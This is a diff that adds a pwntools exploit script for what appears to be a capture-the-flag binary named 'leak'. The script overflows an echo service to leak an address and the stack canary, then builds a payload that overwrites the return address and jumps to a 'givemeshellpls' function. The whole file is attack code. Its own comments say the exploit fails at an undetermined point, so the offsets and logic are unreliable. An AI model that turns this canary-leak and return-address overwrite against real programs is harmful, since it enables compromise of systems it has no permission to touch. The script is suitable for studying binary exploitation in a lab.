@@ -1,0 +1,74 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF("./leak", checksec=False)
+context.log_level = "error"
+
+
+def start(argv=[], *a, **kw):
+    gdbscript = """
+    tbreak main
+    continue
+    """.format(
+        **locals()
+    )
+
+    if args.GDB:
+        context.log_level = "debug"
+        context.terminal = ["tmux", "split", "-h"]
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# our goal ist to overwrite the return address of "givemeshellpls"
+# checksec shows us that we have to considre Canaries and as PIE is enabled also the ASLR
+# ghidra gives us the hint that it might be a ASLR – Information Leak as it has the same strucutre from the sheets
+# we also have to considre that this must be less than 0x400 bytes
+
+def main():
+    io = start()
+
+    # through gdb and ghidra we can collect some offsets here
+    offset          = 0x10
+
+    # start of the buffer to canary
+    btc = 40
+    # canary to master return address
+    ctmra = 8
+
+    msg = io.recvuntil("Welcome to the echo service!\n")
+
+    # we need to overflow the 16 bytes to leak the adress to libc init
+
+    injection = b"AAAAAAAAAAAAAAAA"
+    io.write(injection)
+    rcv = io.recv()
+    rcv = rcv[16:22]
+
+    # from the libc address we can calculate the shellcode and add this to out payload
+    libc_csu_init = int.from_bytes(rcv, "little")
+    shell_addr = libc_csu_init + offset
+    shell = struct.pack('<Q', shell_addr)
+
+    # now as the ouput stops at nullbytes we delete them to reveal the canary
+    # we add an additional byte so the output does no stop there
+    injection = b"A"*(btc+1)
+    io.write(injection)
+    canary_leak = io.recv()
+    canary_leak = canary_leak[-8:-1]
+    # now we just change the least signicant bytes to zero
+    canary = b"".join([b"\0"*(8-len(canary_leak))] + [canary_leak])
+
+    # at last we construct a full injection out of this
+    injection = [b"\n"] + [b"\x00"*(btc - 1)] + [canary] + [b"\x00"*ctmra] + [shell] + [b"\x00"*(8-len(shell))]
+    joined_injection = b"".join(injection)
+
+    io.write(joined_injection)
+
+    # unfortunately until here something went wrong on the way
+    # could not determin what
+    # command = b"cat flag.txt"
+
+if __name__ == "__main__":
+    main()
